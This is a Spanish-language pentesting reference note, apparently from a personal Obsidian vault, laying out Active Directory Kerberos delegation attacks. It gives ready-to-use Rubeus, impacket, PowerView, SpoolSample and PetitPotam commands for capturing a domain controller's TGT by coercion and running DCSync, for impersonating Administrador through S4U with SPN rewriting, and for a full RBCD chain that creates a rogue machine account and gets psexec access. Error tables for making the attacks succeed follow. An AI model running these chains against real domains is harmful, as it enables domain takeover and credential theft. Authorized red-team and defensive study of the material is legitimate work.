---
tipo: meta
aliases:
  - delegación Kerberos
  - S4U
  - RBCD attack
  - Rubeus s4u
tags:
  - meta/referencia
  - dominio/ad
---

# AD delegaciones - matriz de referencia

> [!info] Referencia pura, no un zettel
> Los comandos de los tres tipos de delegación. El criterio está en [[Delegación sin restricciones]], [[Delegación restringida]] y [[Delegación basada en recursos]]; encontrarlas, en [[AD enumeración - matriz de referencia]].

## 0. Cuál es cuál — decidir antes de tocar

| Tipo | Atributo | Quién lo controla | Prerrequisito |
|---|---|---|---|
| Sin restricciones | `TRUSTED_FOR_DELEGATION` (UAC) | el host de origen | admin local en ese host |
| Restringida | `msDS-AllowedToDelegateTo` | el host de origen | control de la cuenta de origen |
| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` | el host de **destino** | escritura sobre el destino |

RBCD es la que más rinde: el permiso de escritura sobre una máquina aparece por todos lados en BloodHound.

## 1. Encontrarlas

```
# BloodHound: pestaña de Cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
MATCH (u)-[:AllowedToDelegate]->(c) RETURN u.name, c.name

# PowerView
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# LDAP — ver AD enumeración § 3 para las máscaras de bits
```

`TRUSTED_FOR_DELEGATION` = bit 524288 en `userAccountControl`.

## 2. Sin restricciones — capturar el TGT

Coaccionar al objetivo (a menudo un DC) a autenticarse al host comprometido:

```
# desde el host con delegación, escuchar y capturar
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# forzar la autenticación del DC
# printer bug
SpoolSample.exe DC01 HOST-CON-DELEGACION
dementor.py -d dominio -u user -p pass HOST-CON-DELEGACION DC01

# PetitPotam (MS-EFSRPC)
PetitPotam.py -u user -p pass HOST-CON-DELEGACION DC01
Coercer.py coerce -u user -p pass -t DC01 -l HOST-CON-DELEGACION
```

Con el TGT del DC capturado, usarlo para DCSync:

```
Rubeus.exe ptt /ticket:TGT_DEL_DC
secretsdump.py -k -no-pass dominio.local/DC01\$@DC01
```

Ver [[Delegación sin restricciones]] y [[DCSync]].

## 3. Restringida — S4U2Self + S4U2Proxy

Con la contraseña/hash de la cuenta con `msDS-AllowedToDelegateTo`:

```
# Rubeus — impersonar Administrador contra el SPN permitido
Rubeus.exe s4u /user:svc_web$ /rc4:HASH /impersonateuser:Administrador \
  /msdsspn:"CIFS/servidor.dominio.local" /ptt

# impacket
getST.py -spn CIFS/servidor.dominio.local -impersonate Administrador \
  dominio.local/svc_web$ -hashes :HASH
export KRB5CCNAME=Administrador.ccache
psexec.py -k -no-pass servidor.dominio.local
```

**Reescribir el SPN** — el servicio no se valida, solo el host:

```
# permiso para TIME/dc, reescrito a LDAP/dc (→ DCSync) o CIFS/dc (→ archivos)
Rubeus.exe s4u /user:svc$ /rc4:HASH /impersonateuser:Administrador \
  /msdsspn:"TIME/dc.dominio.local" /altservice:"LDAP/dc.dominio.local" /ptt
```

Ver [[Delegación restringida]].

## 4. RBCD — configurar y abusar

La cadena completa, la más común hoy:

```
# 1. crear una cuenta de máquina (MachineAccountQuota=10 por defecto)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pass123!' \
  dominio.local/user:pass -dc-ip 10.0.0.10

# 2. escribir el atributo RBCD en la máquina objetivo
rbcd.py -delegate-from 'EVIL$' -delegate-to 'OBJETIVO$' -action write \
  dominio.local/user:pass
# o con PowerView
Set-ADComputer OBJETIVO -PrincipalsAllowedToDelegateToAccount EVIL$

# 3. S4U desde la cuenta creada, impersonando Administrador
getST.py -spn CIFS/objetivo.dominio.local -impersonate Administrador \
  dominio.local/EVIL$:'Pass123!'
export KRB5CCNAME=Administrador.ccache
psexec.py -k -no-pass objetivo.dominio.local
```

Cuando `MachineAccountQuota` es 0, usar una cuenta de servicio con SPN existente en el paso 1.

Ver [[Delegación basada en recursos]].

## 5. SPNs útiles según el objetivo

| SPN impersonado | Da acceso a |
|---|---|
| `CIFS/host` | Recursos compartidos, `psexec` |
| `HOST/host` | Tareas, servicios, ejecución |
| `HTTP/host` | WinRM, PowerShell remoto |
| `LDAP/dc` | DCSync sobre el DC |
| `MSSQLSvc/host:1433` | Base de datos |

## 6. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `KRB_AP_ERR_MODIFIED` | Hash o clave equivocada de la cuenta de origen |
| S4U no devuelve ticket reenviable | El usuario está en Protected Users o es sensible; o falta transición de protocolo |
| `addcomputer` falla | `MachineAccountQuota=0`; usar una cuenta de servicio existente |
| La escritura de RBCD da acceso denegado | No hay permiso sobre el objeto objetivo; verificar en BloodHound |
| El TGT capturado no sirve | Caducó (>10h), o el objetivo no se autenticó realmente |
| La coacción no dispara | Parche de PetitPotam / spooler deshabilitado; probar otro método de coacción |
| `altservice` rechazado | El KDC valida el servicio en esa versión; usar el SPN permitido directo |

## Relacionadas

[[MOC - Active Directory]] · [[AD enumeración - matriz de referencia]] · [[AD movimiento lateral - matriz de referencia]] · [[Delegación basada en recursos]]
